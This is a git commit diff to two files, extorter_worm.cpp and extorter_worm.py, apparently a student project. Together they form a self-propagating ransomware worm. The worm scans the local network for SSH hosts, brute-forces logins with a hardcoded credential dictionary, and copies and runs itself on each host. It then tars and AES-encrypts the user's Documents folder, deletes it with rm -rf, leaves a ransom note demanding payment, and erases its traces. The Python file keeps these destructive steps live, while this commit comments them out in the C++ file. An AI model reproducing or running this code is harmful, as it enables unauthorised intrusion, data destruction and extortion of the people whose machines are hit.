37bef82b56c23b099c955ec9d81976547c41fcb7
NeenuAVarghese <neenuavarghese@gmail.com>
2016-10-18 16:09:13 -0700

    Added more functionalities to CPP file and changed workign logic of Python file

--- extorter_worm.cpp
+++ extorter_worm.cpp
@@ -19,31 +19,55 @@
 #include<map>
 #include <curl/curl.h>
 #include<exception>
- 
- 
- 
- 
- 
- 
+#include<algorithm>
+#include <unistd.h>
+#include <string.h> /* for strncpy */
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <sys/ioctl.h>
+#include <netinet/in.h>
+#include <net/if.h>
+#include <arpa/inet.h>
+  
+  
+  
+ std::ofstream myFile;
+  
+  
 void markInfected() {
     std::ofstream myfile("/tmp/infectionMarker_extWCpp.txt");
- 
+  
     if (myfile.is_open())
     {
         myfile << "This system is infected\n" << std::endl;
         myfile.close();
+	printf("\nCreated Infection marker on the System");
     }
     else
         printf("Unable to open file");
- 
+  
 }
- 
+
+void markInfected2(std::string host) {
+    std::ofstream myfile("/tmp/neenu.txt");
+  
+    if (myfile.is_open())
+    {
+        myfile << "This system is infected\n" << host.c_str() << std::endl;
+        myfile.close();
+	printf("\nCreated Infection marker on the System %d", host.c_str());
+    }
+    else
+        printf("Unable to open file");
+  
+}
+  
 int isInfected(ssh_session session) {
     sftp_file file;
     int rc;
     sftp_session sftp;
     int access_type = O_RDONLY;
- 
+  
     sftp = sftp_new(session);
     if (sftp == NULL)
     {
@@ -51,31 +75,55 @@ int isInfected(ssh_session session) {
             ssh_get_error(session));
         return 11;
     }
- 
+  
     rc = sftp_init(sftp);
     if (rc != SSH_OK)
     {
         sftp_free(sftp);
         return 1;
     }
- 
+  
     file = sftp_open(sftp, "/tmp/infectionMarker_extWCpp.txt", access_type, 0);
     if (file == NULL) {
         printf("\nFile does not exist");
         return 0;
     }
     else {
-        printf("\nSystem Infected");
+        printf("\nSystem is already Infected\n");
         return 1;
     }
 }
+  
+char* getMyIP(){
+
+    int fd;
+    struct ifreq ifr;
  
+    fd = socket(AF_INET, SOCK_DGRAM, 0);
+ 
+    /* I want to get an IPv4 IP address */
+    ifr.ifr_addr.sa_family = AF_INET;
+ 
+    /* I want IP address attached to "eth0" */
+    strncpy(ifr.ifr_name, "eth0", IFNAMSIZ - 1);
+ 
+    ioctl(fd, SIOCGIFADDR, &ifr);
+ 
+    close(fd);
+ 
+    /* display result */
+    printf("%s\n", inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));
+
+	return inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr);
+
+}
+
 std::vector<std::string> getHostsOnSameNetwork() {
     FILE *fp;
     char path[1035];
     std::vector<std::string> res;
     int i;
- 
+  
     fp = popen("nmap 192.168.1.0/24 -p 22 --open | grep 'Nmap scan report for'| cut -f 5 -d ' '", "r");
     if (fp == NULL) {
         printf("\nFailed to run command");
@@ -86,20 +134,22 @@ std::vector<std::string> getHostsOnSameNetwork() {
         while (!feof(fp)) {
             if (fgets(path, sizeof(path), fp) != NULL) {
                 res.push_back(path);
+		myFile << "Inserting: " << path; 
             }
         }
- 
+  
         pclose(fp);
-		res.erase("192.168.1.4");
+     	
+
         return res;
     }
 }
- 
+  
 size_t write_data(void *ptr, size_t size, size_t nmemb, FILE *stream) {
     size_t written = fwrite(ptr, size, nmemb, stream);
     return written;
 }
- 
+  
 void downloadOpenSSL() {
     CURL *curl;
     FILE *fp;
@@ -115,19 +165,19 @@ void downloadOpenSSL() {
         res = curl_easy_perform(curl);
         /* always cleanup */
         curl_easy_cleanup(curl);
-	printf("\n Successfully Downloaded the openssl file");
+    printf("\n Successfully Downloaded the openssl file");
         fclose(fp);
     }
-    
+     
 }
- 
- 
+  
+  
 int copyFile(ssh_session session) {
     sftp_file file;
     int rc;
     int access_type = O_WRONLY | O_CREAT | O_TRUNC;
     sftp_session sftp;
- 
+  
     sftp = sftp_new(session);
     if (sftp == NULL)
     {
@@ -141,7 +191,7 @@ int copyFile(ssh_session session) {
         sftp_free(sftp);
         return rc;
     }
- 
+  
     file = sftp_open(sftp, "/tmp/a.out",
         access_type, S_IRWXU);
     if (file == NULL)
@@ -150,22 +200,22 @@ int copyFile(ssh_session session) {
             ssh_get_error(session));
         return 0;
     }
- 
+  
     std::ifstream fin("/tmp/a.out", std::ios::binary);
     if (fin) {
         fin.seekg(0, std::ios::end);
         std::ios::pos_type length = fin.tellg(); // get file size in bytes
         fin.seekg(0); // rewind to beginning of file
- 
+  
         char* replicatorFile = new char[length];
         fin.read(replicatorFile, length); // read file contents into buffer
- 
+  
         sftp_write(file, replicatorFile, length); // write to remote file
     }
     else {
         return 0;
     }
- 
+  
     rc = sftp_close(file);
     if (rc != SSH_OK)
     {
@@ -175,20 +225,20 @@ int copyFile(ssh_session session) {
     }
     printf("\nCopy Successfull !");
     return 1;
- 
- 
+  
+  
 }
- 
+  
 int executeFile(ssh_session session) {
     ssh_channel channel;
     int rc;
     channel = ssh_channel_new(session);
- 
+  
     if (channel != NULL) {
         rc = ssh_channel_open_session(channel);
         if (rc == SSH_OK) {
             if (copyFile(session)) {
-                rc = ssh_channel_request_exec(channel, "/tmp/a.out");
+                rc = ssh_channel_request_exec(channel, "/tmp/a.out > output.txt");
                 if (rc == SSH_OK) {
                     printf("\nExecuted command on remote machine");
                 }
@@ -212,49 +262,53 @@ int executeFile(ssh_session session) {
         return 0;
     }
 }
- 
+  
 int connectionToHost(ssh_session session, std::string host, std::map<std::string, std::string> &dictAttackList) {
+	 myFile <<"In connection: cstart";
     int rc;
     ssh_options_set(session, SSH_OPTIONS_HOST, host.c_str());
     const char *username, *password;
- 
- 
+  
+  
     rc = ssh_connect(session);
- 
+  myFile <<"In connection: connecting";
     if (rc == SSH_OK) {
- 
+  
         if (ssh_write_knownhost(session) < 0) {
             fprintf(stderr, "Error %s", strerror(errno));
-            return 0;
+		 myFile <<"In connection: cannot write";
+            	return 0;
         }
         else {
             for (std::map<std::string, std::string>::iterator it = dictAttackList.begin(); it != dictAttackList.end(); it++) {
- 
+  
                 username = (it->first).c_str();
                 password = (it->second).c_str();
- 
+  		 myFile <<"In connection: trying username" <<username <<password;
                 rc = ssh_userauth_password(session, NULL, password);
                 if (rc == SSH_AUTH_SUCCESS) {
                     printf("\nLogin Success");
+ myFile <<"In connection: Login Success";
                     return 1;
                 }
             }
             if (rc != SSH_AUTH_SUCCESS) {
                 printf("\n Error Authenticating");
+		 myFile <<"In connection: cannot autheticate";
             }
         }
- 
+  
     }
- 
+  
     else {
         fprintf(stderr, "\nError Connecting to localhost: %s\n", ssh_get_error(session));
         return 0;
     }
 }
- 
- 
- 
- 
+  
+  
+  
+  
 void initializeDict(std::map<std::string, std::string> &dictAttackList) {
     dictAttackList["ubuntu"] = "123456";
     dictAttackList["hello"] = "worlds";
@@ -262,67 +316,80 @@ void initializeDict(std::map<std::string, std::string> &dictAttackList) {
     dictAttackList["network"] = "security";
     printf("\nDictionary Initialized !!!");
 }
- 
+  
 void tarAndEncrypt(){
-	try{
-			system("chmod a+x ./openssl");
-			system("tar -zcvf DocumentsDir.tar.gz -P /home/ubuntu/Documents/");
-			printf("Created tar of the folder");
-			system("./openssl aes-256-cbc -a -salt -in DocumentsDir.tar.gz -out DocumentsDir.tar.enc -k cpsc456worm");
-			printf("Created Encrypted File");
-		}
-		catch(...){
-			std::cout<<"Exception is occured";
-		}
+    try{
+            system("chmod a+x ./openssl");
+            system("tar -zcvf DocumentsDir.tar.gz -P /home/ubuntu/Documents/");
+            printf("\n Created tar of the Documents folder");
+            system("./openssl aes-256-cbc -a -salt -in DocumentsDir.tar.gz -out DocumentsDir.tar.enc -k cpsc456worm");
+            printf("\n Created Encrypted File");
+        }
+        catch(...){
+            std::cout<<"Exception is occured";
+        }
 }
-
+ 
 void deleteDirAndLeaveMessage() {
-	system("rm -rf /home/ubuntu/Documents/");
-	printf("Deleted Documents");
-	system("cp DocumentsDir.tar.enc /home/ubuntu/Desktop/");
-	std::ofstream myfile("/home/ubuntu/Desktop/SystemCompromisedCpp.txt");
-
-	if (myfile.is_open())
-	{
-		myfile << "Your Documents Directory has been encrypted ! Pay me to get the decryption Key\n" << std::endl;
-		myfile.close();
-	}
-	else
-		printf("Unable to open file");
+    system("rm -rf /home/ubuntu/Documents/");
+    printf("\n Deleted Documents folder");
+    system("cp DocumentsDir.tar.enc /home/ubuntu/Desktop/");
+    std::ofstream myfile("/home/ubuntu/Desktop/SystemCompromisedCpp.txt");
+ 
+    if (myfile.is_open())
+    {
+        myfile << "Your Documents Directory has been encrypted ! Pay me to get the decryption Key\n" << std::endl;
+        myfile.close();
+    }
+    else
+        printf("\n Unable to open file for wrtign Threat message");
 }
- 
+  
 int main() {
- 
+  
     ssh_session my_ssh_session;
     ssh_channel channel;
     int res;
+
+myFile.open("/tmp/check.txt");
     std::map<std::string, std::string> dictAttackList;
     initializeDict(dictAttackList);
     markInfected();
+myFile << "Cto If" <<std::endl;
+	if(strcmp(getMyIP(), "192.168.1.4") != 0){
+		//downloadOpenSSL();
+                //tarAndEncrypt();
+		//deleteDirAndLeaveMessage();
+	}
+myFile << "Came back"<<std::endl;
     std::vector<std::string> hosts = getHostsOnSameNetwork();
- 
+	myFile << "Came back after get hosts";
     for (std::vector<std::string>::iterator host = hosts.begin(); host != hosts.end(); ++host) {
         std::cout << "\n Host: " << *host;
- 
+  	myFile << *host <<std::endl;
         my_ssh_session = ssh_new();
-        if (my_ssh_session == NULL)
-            exit(-1);
- 
+	
+        if (my_ssh_session == NULL){
+		myFile << "My ssh is NULL" << my_ssh_session <<std::endl;
+		exit(-1);
+	}           
+ myFile << "My ssh is not null" << my_ssh_session <<std::endl;
+
         if (connectionToHost(my_ssh_session, *host, dictAttackList) > 0) {
             printf("\nSucceded to get into the host");
- 
+  		myFile << "Logged in to "<<*host <<std::endl;
             if (!isInfected(my_ssh_session)) {
+		myFile << "this is not infected" <<*host<<std::endl;
                 res = executeFile(my_ssh_session);
+		
                 if (res) {
-					downloadOpenSSL();
-					tarAndEncrypt();
-					deleteDirAndLeaveMessage();
+                    
                     std::cout << "\n Infected. " << *host << ". I can rest now ;)\n";
                     break;
                 }
             }
         }
     }
-
-	
+ myFile.close();
+     
 }
--- extorter_worm.py
+++ extorter_worm.py
@@ -9,12 +9,12 @@ from time import sleep
 from subprocess import Popen
 import os
 import shutil
- 
- 
+  
+  
 # File marking the presence of a worm in a system
 INFECTION_MARKER = "/tmp/infectionMarker_extW_python.txt"
-   
-   
+    
+    
 # List of credentials for Dictionary Attack
 DICTIONARYATTACK_LIST = {
         'crazy': 'things',
@@ -23,7 +23,7 @@ DICTIONARYATTACK_LIST = {
         'ubuntu': '123456'
         }
 ATTACKER_IP = "192.168.1.4"
-   
+    
 #############################################
 #Creates a marker file on the target system
 #############################################
@@ -31,8 +31,8 @@ def markInfected():
     marker = open(INFECTION_MARKER, "w")
     marker.write("I have infected your system")
     marker.close()
-   
-   
+    
+    
 #######################################################
 #Checks if target system is infected
 #@return - True if System is infected; False otherwise
@@ -40,18 +40,18 @@ def markInfected():
 #######################################################
 def isInfected(sshC):
     infected = False
-   
+    
     try:
         sftpClient = sshC.open_sftp()
         sftpClient.stat(INFECTION_MARKER)
         infected = True
-           
+            
     except Exception, e:
-    	print("System is not infected")
-    	infected = False  
-   
-    return infected  
-       
+        print("System is not infected")
+        infected = False 
+    
+    return infected 
+        
 ###########################################
 #Returns IP of the current System
 #Tries to Connect to global DNS and gets IP address of ETH0
@@ -61,8 +61,8 @@ def getMyIP():
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         s.connect(('4.2.2.2', 80))
         return s.getsockname()[0]
-  
    
+    
 ##########################################################
 #Scans the Network to check Live hosts on Port 22
 #@return - a list of all IP addresses on the same network
@@ -78,21 +78,20 @@ def getHostsOnTheSameNetwork():
     print("My IP is: "+ getMyIP())
     liveHosts.remove(getMyIP())
     return liveHosts
-   
+    
 #########################################################
 #Removes all the worm traces from the remote host
 ########################################################
 def cleanTraces():
     try:
-    	os.remove("/tmp/openssl")
-    	os.remove("/tmp/DocumentsDir.tar.enc")
-    	os.remove("/tmp/DocumentsDir.tar")
-    	os.remove("/tmp/extorter_worm.py")
-    	shutil.rmtree("/home/ubuntu/Documents/")
-    	print("Cleaned up all traces")
+        os.remove("/home/ubuntu/openssl")
+        os.remove("/home/ubuntu/DocumentsDir.tar")
+        os.remove("/tmp/extorter_worm.py")
+        shutil.rmtree("/home/ubuntu/Documents/")
+        print("Cleaned up all traces")
     except:
-    	print("Files does not exist")
- 
+        print("Files does not exist")
+  
 ############################################
 #Exploits the target system
 ##########################################
@@ -103,8 +102,8 @@ def launchAttack(ssh):
     ssh.exec_command("chmod a+x /tmp/extorter_worm.py")
     ssh.exec_command("nohup python -u /tmp/extorter_worm.py > /tmp/worm.output &")
     print("Copied and executed worm into the system...")
-          
-  
+           
+   
 ##############################################
 #Tries login with the Target System
 #@param hostIP - IP of target system
@@ -117,10 +116,10 @@ def attackSystem(hostIP, userName, passWord):
     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     ssh.connect(hostIP, username = userName, password = passWord)
     return ssh
-  
-  
-  
-  
+   
+   
+   
+   
 #########################################################################
 #Tries to find correct Credentails in the available Dictionary
 #@param - hostIp - IP of a client is sent ot test if login is sucessful
@@ -129,18 +128,18 @@ def attackSystem(hostIP, userName, passWord):
 #########################################################################
 def checkCredentials(hostIp):
     ssh = False
-       
+        
     for k in DICTIONARYATTACK_LIST.keys():
         try:
             ssh = attackSystem(hostIp, k, DICTIONARYATTACK_LIST[k])
             if ssh:
                 return ssh
         except:
-            pass  
+            pass 
     print("Could not login to the system")
     return ssh
+   
   
- 
 ##############################################
 #Downlaods openSSL and extortion note files
 ##############################################
@@ -151,42 +150,41 @@ def downloadFiles():
         Popen(["chmod", "a+x", "./openssl"])
     except Exception, e:
         print("Problem in Execution:", e)
- 
+  
 ###############################################
 #Create tar of the /home/ubuntu/Documens Dir
 ###############################################
 def createTarAndEncrypt():
     try:
-        os.chdir("/tmp/")
-        tar = tarfile.open("DocumentsDir.tar", "w:gz")       
+        tar = tarfile.open("DocumentsDir.tar", "w:gz")      
         tar.add('/home/ubuntu/Documents/')
         tar.close()
         print("Finished tar of Documents folder")
- 
+  
         #Encrypt tar file
         Popen(["./openssl", "aes-256-cbc", "-a", "-salt", "-in", "DocumentsDir.tar", "-out", "DocumentsDir.tar.enc", "-k", "-cs456worm"])
         print("Created Encryption File")
     except Exception, e:
-    	print("Problem in Execution:", e)
- 
+        print("Problem in Execution:", e)
   
+   
 def leaveNote():
-    marker = open("/home/ubuntu/Desktop/SystemCompromised.txt", "w")
+    marker = open("/home/ubuntu/SystemCompromised.txt", "w")
     marker.write("We have deleted the Documents Folder. An encrypted version is placed on your Desktop. You will have to purchase the encrytpion key from us !!!")
-    marker.close()   
-  
+    marker.close()  
+   
 ##############################################################
 #This is start of the replicator worm
 ##############################################################
-          
+           
 print("Started infecting the network .....")
-   
+    
 #Get all hosts in the network
 discoveredHosts = getHostsOnTheSameNetwork()
 markInfected()
 myIp = getMyIP()
- 
- 
+  
+  
 #######################################################################################
 #1. Download Open SSL program
 #2. Create tar and encrypt the '/home/cpsc/Documents' folder
@@ -196,17 +194,13 @@ myIp = getMyIP()
 if(cmp(myIp, ATTACKER_IP) != 0):
     try:
         print("In the function")
-        os.chdir("/tmp/")
         downloadFiles()
         createTarAndEncrypt()
         leaveNote()
-    	Popen(["chmod", "a+x", "/tmp/DocumentsDir.tar.enc"])
-    	shutil.copy("/tmp/DocumentsDir.tar.enc", "/home/ubuntu/Desktop/")  
-    	print("Copied Encrypted file to Desktop")
     except Exception, e:
-    	print("Problem in Execution:", e)
- 
+        print("Problem in Execution:", e)
   
+   
 for host in discoveredHosts:
     print(host + " under Observation ...")
     ssh = None
@@ -219,10 +213,10 @@ for host in discoveredHosts:
                     launchAttack(ssh)
                     ssh.close()
                     break
-        	except:
-            	    print("Failed to execute worm")
-            	    print("---------------------") 
-            	    continue
+            	except:
+                    print("Failed to execute worm")
+                    print("---------------------")
+                    continue
             else:
                 print(host + " is already infected")
     except socket.error:
@@ -230,10 +224,10 @@ for host in discoveredHosts:
     except paramiko.ssh_exception.AuthenticationException:
         print("Wrong Credentials")
     print("---------------------")
- 
+  
 if(cmp(myIp, ATTACKER_IP) != 0):
     try:
         cleanTraces()
     except Exception, e:
-    	print("Problem in Execution:", e) 
+        print("Problem in Execution:", e)
     print("I am done now !!")
